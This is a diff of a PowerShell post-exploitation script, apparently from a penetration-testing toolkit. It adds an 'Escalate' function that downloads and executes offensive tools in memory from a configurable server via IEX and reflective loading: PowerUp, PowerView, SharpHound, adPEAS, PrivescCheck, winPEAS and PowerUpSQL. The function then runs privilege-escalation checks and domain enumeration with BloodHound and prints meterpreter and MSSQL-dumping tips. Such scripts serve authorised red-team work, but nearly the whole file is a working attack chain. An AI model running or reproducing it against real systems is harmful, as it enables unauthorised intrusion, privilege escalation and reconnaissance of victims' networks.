@@ -1,31 +1,51 @@
-systeminfo | tee systeminfo.txt
-$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url_1029384756/tools/winPEASany_ofs.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("log=$pwd/winpeas.txt")
-Invoke-HostRecon | tee hostrecon.txt
-Invoke-AllChecks | tee powerup.txt
-Invoke-PrivescCheck | tee privesccheck.txt
-Invoke-adPEAS | tee adpeas.txt
-Invoke-BloodHound -CollectionMethod All,GPOLocalGroup -outputdirectory $pwd
+function Escalate {
+    if($url_1029384756 -eq $null){
+        Write-Host -NoNewline -ForegroundColor DarkRed " [ERROR]"
+        Write-Host -NoNewline -ForegroundColor Yellow " Use "
+        Write-Host -NoNewline -ForegroundColor DarkYellow "Invoke-Wisp -Url 'http://<your_server>/' "
+        Write-Host -NoNewline -ForegroundColor Yellow "first, to set the URL for the functions."
+        return
+    }
+    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/HostRecon.txt")
+    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/PrivescCheck.txt")
+    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/PowerUp.txt")
+    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/PowerView.txt")
+    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/SharpHound.txt")
+    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/adPEAS.txt")
+    IEX(new-object system.net.webclient).downloadstring("$url_1029384756/tools/LAPSToolkit.txt")
+    IEX(New-Object System.Net.WebClient).DownloadString("$url_1029384756/tools/PowerUpSQL.txt")
+    IEX(New-Object System.Net.WebClient).DownloadString("$url_1029384756/tools/Invoke-Portscan.txt")
 
-Write-Host -NoNewline -ForegroundColor DarkGreen " [REMINDER]"
-Write-Host -ForegroundColor Blue "(https://github.com/bitsadmin/wesng)"
-Write-Host -ForegroundColor Yellow "Download and check the systeminfo.txt with:"
-Write-Host -ForegroundColor DarkYellow "`twes --update && wes systeminfo.txt`n"
+    systeminfo | tee systeminfo.txt
+    $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url_1029384756/tools/winPEASany_ofs.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("log=$pwd/winpeas.txt")
+    Invoke-HostRecon | tee hostrecon.txt
+    Invoke-AllChecks | tee powerup.txt
+    Invoke-PrivescCheck | tee privesccheck.txt
+    Invoke-adPEAS | tee adpeas.txt
+    Invoke-BloodHound -CollectionMethod All,GPOLocalGroup -outputdirectory $pwd
 
-Write-Host -NoNewline -ForegroundColor DarkGreen " [REMINDER]"
-Write-Host -ForegroundColor Yellow "Check every suspicious directory & file inside:"
-Write-Host -ForegroundColor DarkYellow "`tC:\Users`n`tC:\Program Files`n`tC:\"
+    Write-Host -NoNewline -ForegroundColor DarkGreen " [REMINDER]"
+    Write-Host -ForegroundColor Blue "(https://github.com/bitsadmin/wesng)"
+    Write-Host -ForegroundColor Yellow "Download and check the systeminfo.txt with:"
+    Write-Host -ForegroundColor DarkYellow "`twes --update && wes systeminfo.txt`n"
 
-Write-Host -NoNewline -ForegroundColor DarkGreen " [REMINDER]"
-Write-Host -ForegroundColor Yellow "Try escalate with meterpreter:"
-Write-Host -ForegroundColor DarkYellow "`tload priv`n`tgetsystem"
+    Write-Host -NoNewline -ForegroundColor DarkGreen " [REMINDER]"
+    Write-Host -ForegroundColor Yellow "Check every suspicious directory & file inside:"
+    Write-Host -ForegroundColor DarkYellow "`tC:\Users`n`tC:\Program Files`n`tC:\"
 
-Write-Host -NoNewline -ForegroundColor DarkGreen " [REMINDER]"
-Write-Host -ForegroundColor Yellow "ENUMERATE MSSQL:"
-Write-Host -ForegroundColor DarkYellow @"
-Get-SQLInstanceLocal -Verbose
-Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | ft
-Get-SQLServerInfo -Instance SQL_NAME
-Invoke-SQLAudit -Verbose -Instance SQL_NAME 
-Invoke-SQLDumpInfo -Verbose -Instance "SQL_NAME"
-Get-SqlServerLinkCrawl -Instance SQL_NAME | select instance,links | ft
+    Write-Host -NoNewline -ForegroundColor DarkGreen " [REMINDER]"
+    Write-Host -ForegroundColor Yellow "Try escalate with meterpreter:"
+    Write-Host -ForegroundColor DarkYellow "`tload priv`n`tgetsystem"
+
+    Write-Host -NoNewline -ForegroundColor DarkGreen " [REMINDER]"
+    Write-Host -ForegroundColor Yellow "ENUMERATE MSSQL:"
+    Write-Host -ForegroundColor DarkYellow @"
+    Get-SQLInstanceLocal -Verbose
+    Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | ft
+    Get-SQLServerInfo -Instance SQL_NAME
+    Invoke-SQLAudit -Verbose -Instance SQL_NAME 
+    Invoke-SQLDumpInfo -Verbose -Instance "SQL_NAME"
+    Get-SqlServerLinkCrawl -Instance SQL_NAME | select instance,links | ft
 "@
+}
+Escalate
